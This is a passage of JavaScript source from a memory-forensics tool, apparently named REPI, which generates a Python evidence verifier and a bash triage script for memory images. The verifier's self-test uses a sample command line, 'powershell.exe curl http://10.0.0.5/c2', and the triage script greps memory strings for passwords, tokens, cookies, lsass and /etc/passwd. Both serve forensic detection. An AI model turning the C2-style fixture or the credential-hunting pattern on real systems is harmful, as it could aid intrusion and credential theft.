		"missing-memory-credential-context-verification": "Tie credential bytes to source-bound process, commandline, network, or file evidence before promotion.",
		"missing-memory-timeline-verification": "Bind timestamp rows to source-bound process/network evidence before claiming a timeline proof.",
		"missing-memory-negative-control": "Add byte mutation controls so altered memory evidence is rejected by hash.",
	};
	const repairQueue = blockers.map((blocker) => ({
		id: "memory-evidence-" + blocker,
		blocker,
		action: repairActions[blocker] ?? "Collect source-bound memory evidence and rerun evidence claim promotion.",
		rerunCommand: /^missing-memory-/.test(blocker)
			? "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json"
			: "repi engage <memory-image> --json",
	}));
	return {
		kind: "repi-memory-evidence-claims",
		schemaVersion: 2,
		generatedAt: new Date().toISOString(),
		proofReady: promotedClaims.length > 0,
		verificationStats: verification?.stats ?? null,
		claimLedger,
		composedPaths,
		promotionReport: {
			proofReady: promotedClaims.length > 0,
			promotedClaims,
			blockers,
		},
		repairQueue,
	};
}

function memoryEvidenceVerifierSource() {
	return String.raw`#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
import tempfile


def sha256(data):
    return hashlib.sha256(data).hexdigest()


def signal_rows(summary):
    out = []
    for kind, values in (summary.get("stringScan", {}).get("signals") or {}).items():
        if not isinstance(values, list):
            continue
        for row in values[:120]:
            out.append({"kind": kind, "sourceOffset": row.get("sourceOffset", row.get("offset")), "text": row.get("text", ""), "valueSha256": row.get("valueSha256"), "valueLength": row.get("valueLength")})
    return out


def verify_signal_rows(data, summary):
    rows = []
    for row in signal_rows(summary):
        try:
            offset = int(row.get("sourceOffset"))
            length = int(row.get("valueLength"))
        except Exception:
            offset = -1
            length = -1
        expected = row.get("valueSha256")
        actual = {}
        verified = False
        reason = "missing-offset-hash-binding"
        control = None
        if offset >= 0 and length > 0 and expected:
            if offset + length > len(data):
                reason = "signal-offset-out-of-range"
            else:
                chunk = data[offset:offset + length]
                actual = {"sha256": sha256(chunk), "length": len(chunk)}
                verified = actual["sha256"] == expected and actual["length"] == length
                reason = "memory-signal-offset-hash-match" if verified else "memory-signal-offset-hash-mismatch"
                if chunk:
                    mutated = bytearray(chunk)
                    mutated[0] ^= 0xFF
                    mutated_sha = sha256(bytes(mutated))
                    control = {"controlType": "memory-signal-byte-mutation-rejection", "mutatedSha256": mutated_sha, "passed": mutated_sha != expected}
        rows.append({"kind": row.get("kind"), "sourceOffset": offset if offset >= 0 else None, "redactedText": row.get("text"), "valueSha256": expected, "valueLength": length if length > 0 else None, "actual": actual, "verified": verified, "reason": reason, "negativeControl": control})
    return rows


def verified_offset(checks, kind, offset):
    return next((row for row in checks if row.get("kind") == kind and row.get("sourceOffset") == offset and row.get("verified")), None)


def correlation_rows(summary, checks):
    rows = []
    cor = summary.get("correlations") or {}
    for row in (cor.get("processNetwork") or [])[:40]:
        cmd = (row.get("cmdline") or {}).get("sourceOffset", (row.get("cmdline") or {}).get("offset"))
        net = (row.get("network") or {}).get("sourceOffset", (row.get("network") or {}).get("offset"))
        distance = abs(cmd - net) if isinstance(cmd, int) and isinstance(net, int) else None
        ok = bool(verified_offset(checks, "cmdlines", cmd) and verified_offset(checks, "network", net) and distance is not None and distance <= 512)
        rows.append({"correlationType": "process-network", "cmdlineOffset": cmd, "networkOffset": net, "distance": distance, "verified": ok, "reason": "process-network-distance-verified" if ok else "missing-source-offset-verification"})
    for row in (cor.get("credentialContext") or [])[:40]:
        cred = (row.get("credential") or {}).get("sourceOffset", (row.get("credential") or {}).get("offset"))
        cmd = (row.get("cmdline") or {}).get("sourceOffset", (row.get("cmdline") or {}).get("offset")) if row.get("cmdline") else None
        net = (row.get("network") or {}).get("sourceOffset", (row.get("network") or {}).get("offset")) if row.get("network") else None
        file_offset = (row.get("file") or {}).get("sourceOffset", (row.get("file") or {}).get("offset")) if row.get("file") else None
        context = bool(verified_offset(checks, "cmdlines", cmd) or verified_offset(checks, "network", net) or verified_offset(checks, "files", file_offset))
        ok = bool(verified_offset(checks, "credentials", cred) and context)
        rows.append({"correlationType": "credential-context", "credentialOffset": cred, "cmdlineOffset": cmd, "networkOffset": net, "fileOffset": file_offset, "verified": ok, "reason": "credential-context-source-offsets-verified" if ok else "missing-credential-context-source-offset-verification"})
    for row in (cor.get("timeline") or [])[:40]:
        ts = (row.get("timestamp") or {}).get("sourceOffset", (row.get("timestamp") or {}).get("offset"))
        cmd = (row.get("cmdline") or {}).get("sourceOffset", (row.get("cmdline") or {}).get("offset")) if row.get("cmdline") else None
        net = (row.get("network") or {}).get("sourceOffset", (row.get("network") or {}).get("offset")) if row.get("network") else None
        ok = bool(verified_offset(checks, "timestamps", ts) and (verified_offset(checks, "cmdlines", cmd) or verified_offset(checks, "network", net)))
        rows.append({"correlationType": "timeline", "timestampOffset": ts, "cmdlineOffset": cmd, "networkOffset": net, "verified": ok, "reason": "timeline-source-offsets-verified" if ok else "missing-timeline-source-offset-verification"})
    return rows


def verify(memory_path, quicklook_path):
    with open(memory_path, "rb") as handle:
        data = handle.read()
    with open(quicklook_path, "r", encoding="utf-8") as handle:
        summary = json.load(handle)
    image = {"size": len(data), "sha256": sha256(data), "verified": len(data) == summary.get("size") and sha256(data) == summary.get("sha256")}
    if data:
        mutated = bytearray(data)
        mutated[0] ^= 0xFF
        mutated_sha = sha256(bytes(mutated))
        image["negativeControl"] = {"controlType": "memory-image-byte-mutation-rejection", "mutatedSha256": mutated_sha, "passed": mutated_sha != summary.get("sha256")}
    signal_checks = verify_signal_rows(data, summary)
    corr_checks = correlation_rows(summary, signal_checks)
    controls = [image.get("negativeControl")] + [row.get("negativeControl") for row in signal_checks]
    controls = [row for row in controls if row and row.get("passed")]
    verified_signals = [row for row in signal_checks if row.get("verified")]
    pn = [row for row in corr_checks if row.get("verified") and row.get("correlationType") == "process-network"]
    cred = [row for row in corr_checks if row.get("verified") and row.get("correlationType") == "credential-context"]
    timeline = [row for row in corr_checks if row.get("verified") and row.get("correlationType") == "timeline"]
    blockers = []
    if not image.get("verified"):
        blockers.append("missing-memory-image-hash-verification")
    if not verified_signals:
        blockers.append("missing-memory-signal-offset-verification")
    if (summary.get("correlations", {}).get("processNetwork") and not pn):
        blockers.append("missing-memory-process-network-verification")
    if (summary.get("correlations", {}).get("credentialContext") and not cred):
        blockers.append("missing-memory-credential-context-verification")
    if (summary.get("correlations", {}).get("timeline") and not timeline):
        blockers.append("missing-memory-timeline-verification")
    if not controls:
        blockers.append("missing-memory-negative-control")
    proof_ready = image.get("verified") and bool(verified_signals) and bool(controls) and (bool(cred) or bool(pn) or bool(timeline))
    repair_queue = [{"id": "memory-evidence-verification-" + blocker, "blocker": blocker, "action": "Collect verifier-bound memory evidence and rerun memory-evidence-verifier.py.", "rerunCommand": "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json"} for blocker in blockers]
    return {"kind": "repi-memory-evidence-verification", "schemaVersion": 1, "target": memory_path, "proofReady": proof_ready, "imageIdentity": image, "signalChecks": signal_checks, "correlationChecks": corr_checks, "negativeControls": controls, "stats": {"signalsVerified": len(verified_signals), "processNetworkVerified": len(pn), "credentialContextVerified": len(cred), "timelineVerified": len(timeline), "negativeControlsPassed": len(controls)}, "repairQueue": repair_queue, "promotionReport": {"proofReady": proof_ready, "blockers": blockers}}


def self_test():
    with tempfile.TemporaryDirectory() as tmp:
        chunks = [b"Windows 10 Pro", b"powershell.exe curl http://10.0.0.5/c2", b"password=redacted", b"2026-07-01 10:20:30"]
        data = b"\x00".join(chunks)
        path = os.path.join(tmp, "mem.vmem")
        with open(path, "wb") as handle:
            handle.write(data)
        def row(kind, value):
            offset = data.index(value)
            return {"text": value.decode(), "offset": offset, "sourceOffset": offset, "valueSha256": sha256(value), "valueLength": len(value)}
        cmd = row("cmdlines", chunks[1])
        net_value = b"http://10.0.0.5/c2"
        net_offset = data.index(net_value)
        net = {"text": net_value.decode(), "offset": net_offset, "sourceOffset": net_offset, "valueSha256": sha256(net_value), "valueLength": len(net_value)}
        cred = row("credentials", chunks[2])
        ts = row("timestamps", chunks[3])
        summary = {"size": len(data), "sha256": sha256(data), "osGuess": "windows", "stringScan": {"signals": {"cmdlines": [cmd], "network": [net], "credentials": [cred], "timestamps": [ts]}}, "correlations": {"processNetwork": [{"cmdline": cmd, "network": net}], "credentialContext": [{"credential": cred, "cmdline": cmd, "network": net}], "timeline": [{"timestamp": ts, "cmdline": cmd, "network": net}]}}
        quicklook = os.path.join(tmp, "memory-quicklook.json")
        with open(quicklook, "w", encoding="utf-8") as handle:
            json.dump(summary, handle)
        result = verify(path, quicklook)
        assert result["proofReady"], json.dumps(result, sort_keys=True)
        print(json.dumps({"kind": "repi-memory-evidence-verifier-self-test", "status": "ok", "stats": result["stats"]}, sort_keys=True))


def main():
    parser = argparse.ArgumentParser(description="Verify REPI memory quicklook signals and correlations against source bytes.")
    parser.add_argument("memory", nargs="?")
    parser.add_argument("quicklook", nargs="?", default="memory-quicklook.json")
    parser.add_argument("output", nargs="?", default="memory-evidence-verification.json")
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()
    if args.self_test:
        self_test()
        return 0
    if not args.memory:
        parser.error("memory is required unless --self-test is used")
    result = verify(args.memory, args.quicklook)
    with open(args.output, "w", encoding="utf-8") as handle:
        json.dump(result, handle, indent=2, sort_keys=True)
        handle.write("\n")
    print(json.dumps({"kind": result["kind"], "proofReady": result["proofReady"], "stats": result["stats"], "output": args.output}, sort_keys=True))
    return 0 if result["proofReady"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
`;
}


function memoryTriagePlanSource(target) {
	return `#!/usr/bin/env bash
set -euo pipefail

MEM=\${1:-${shellQuote(target)}}
OUT=\${2:-memory-triage-\$(basename "$MEM")}
mkdir -p "$OUT"/{volatility,strings,logs}
printf '[repi-memory] input=%s out=%s\\n' "$MEM" "$OUT" | tee "$OUT/logs/plan.log"

if command -v volatility3 >/dev/null 2>&1; then
  VOL=(volatility3 -f "$MEM")
elif command -v vol >/dev/null 2>&1; then
  VOL=(vol -f "$MEM")
else
  VOL=()
  printf '[repi-memory] volatility=missing; using strings fallback\\n' | tee -a "$OUT/logs/plan.log"
fi

if [ "\${#VOL[@]}" -gt 0 ]; then
  for plugin in windows.info windows.pslist windows.pstree windows.cmdline windows.netscan linux.banners linux.pslist linux.proc.Maps mac.pslist; do
    safe=\$(printf '%s' "$plugin" | tr '/.' '__')
    "\${VOL[@]}" "$plugin" > "$OUT/volatility/$safe.txt" 2>&1 || true
  done
fi

strings -a -n 5 "$MEM" 2>/dev/null | grep -Eai 'password|passwd|token|secret|authorization|cookie|session|powershell|cmd\\.exe|lsass|sshd|https?://|([0-9]{1,3}\\.){3}[0-9]{1,3}|/etc/passwd|/home/|Users\\\\' | head -2000 > "$OUT/strings/high-signal.txt" || true

cat > "$OUT/next.txt" <<'EOF'
1. Bind OS/profile from volatility output or memory-quicklook.json osHints.
2. Build process tree + commandline timeline before carving credentials.
3. Correlate network endpoints with process/cmdline evidence.
4. Rerun memory-evidence-verifier.py when present; require source offsets, hashes, correlation windows, and mutation controls before proof promotion.
5. Treat credential strings as leads until tied to process, path, registry hive, or network artifact.
EOF
`;
}

export function memoryQuicklookRows(target, artifactDir) {
	try {
		const summary = memoryQuicklookSummary(target);
		const evidenceVerification = memoryEvidenceVerificationSummary(target, summary);
		const evidenceClaims = memoryEvidenceClaims(summary, evidenceVerification);
		if (!noWrite && artifactDir) writePrivate(join(artifactDir, "memory-quicklook.json"), `${JSON.stringify(summary, null, 2)}\n`);
		if (!noWrite && artifactDir) writePrivate(join(artifactDir, "memory-evidence-verification.json"), `${JSON.stringify(evidenceVerification, null, 2)}\n`);
		if (!noWrite && artifactDir) writePrivate(join(artifactDir, "memory-evidence-claims.json"), `${JSON.stringify(evidenceClaims, null, 2)}\n`);
		const rows = [
			{
				id: "memory-quicklook",
				command: "internal",
				args: [redact(target)],
				cwd: root,
				exit: 0,
				signal: null,
				durationMs: 0,
				stdout: `${JSON.stringify(summary, null, 2)}\n`,
				stderr: "",
				error: undefined,
			},
			{
				id: "memory-evidence-verification",
				command: "internal",
				args: [redact(target)],
				cwd: root,
				exit: evidenceVerification.proofReady ? 0 : 1,
				signal: null,
				durationMs: 0,
				stdout: `${JSON.stringify(evidenceVerification, null, 2)}\n`,
				stderr: "",
				error: evidenceVerification.proofReady ? undefined : "memory evidence verification blockers present",
			},
			{
				id: "memory-evidence-claims",
				command: "internal",
				args: [redact(target)],
				cwd: root,
				exit: evidenceClaims.proofReady ? 0 : 1,
				signal: null,
				durationMs: 0,
				stdout: `${JSON.stringify(evidenceClaims, null, 2)}\n`,
				stderr: "",
				error: evidenceClaims.proofReady ? undefined : "no memory evidence claims promoted",
			},
		];
		if (!noWrite && artifactDir) {
			const verifierPath = join(artifactDir, "memory-evidence-verifier.py");
			writePrivate(verifierPath, memoryEvidenceVerifierSource(), 0o700);
			rows.push({
				id: "memory-evidence-verifier-artifact",
				command: "internal",
				args: [redact(verifierPath)],
				cwd: root,
				exit: 0,
				signal: null,
				durationMs: 0,
				stdout: `verifier=${redact(verifierPath)}\nrun=python3 ${redact(verifierPath)} ${redact(target)} ${redact(join(artifactDir, "memory-quicklook.json"))} ${redact(join(artifactDir, "memory-evidence-verification.json"))}\n`,
				stderr: "",
				error: undefined,
			});
			const planPath = join(artifactDir, "memory-triage-plan.sh");
			writePrivate(planPath, memoryTriagePlanSource(target), 0o700);
			rows.push({
				id: "memory-triage-plan-artifact",
				command: "internal",
				args: [redact(planPath)],
				cwd: root,
				exit: 0,
				signal: null,
				durationMs: 0,
				stdout: `plan=${redact(planPath)}\nrun=bash ${redact(planPath)} ${redact(target)}\n`,
				stderr: "",
				error: undefined,
			});
		}
		return rows;
	} catch (error) {
		return [{ id: "memory-quicklook", command: "internal", args: [redact(target)], cwd: root, exit: 1, signal: null, durationMs: 0, stdout: "", stderr: error instanceof Error ? error.message : String(error), error: error instanceof Error ? error.message : String(error) }];
	}
}
